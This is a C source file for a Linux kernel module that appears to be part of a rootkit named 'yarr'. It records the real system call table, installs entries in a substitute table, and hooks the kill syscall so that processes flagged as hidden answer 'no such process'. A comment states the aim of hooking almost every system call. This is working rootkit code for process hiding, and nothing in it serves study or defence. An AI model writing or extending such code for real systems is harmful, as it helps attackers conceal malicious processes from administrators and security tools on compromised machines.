#include <asm/unistd.h>
#include <linux/errno.h>
#include <linux/syscalls.h>

#include "hook_syscalls.h"
#include "log.h"
#include "hidepid.h"

unsigned long *orig_sct = NULL;

#define __CAST_TO_SYSCALL(ptr) ((long (*)(const struct pt_regs *))(ptr))

YARRHOOK_DEFINE(kill,
        if (pid_is_hidden(regs->di)) {
            return -ESRCH;
        })

int hook_syscalls(unsigned long *fake_sct, unsigned long *real_sct) {
    if (fake_sct == NULL || real_sct == NULL) {
        yarr_log("Syscall tables are NULL");
        return -1;
    }

    // We should be called just once. Write down the address of the
    // syscall table of the system, the real one.
    if (orig_sct != NULL) {
        yarr_log("Double call detected!");
        return -1;
    } else {
        orig_sct = real_sct;
    }

    // We hook in the fake_sct (the one we should put in-place) every system
    // call we need to. Ideally we will end up with every (or almost) system
    // call hooked.
    fake_sct[__NR_kill] = (unsigned long)__yarr__x64_sys_kill;
    return 0;
}

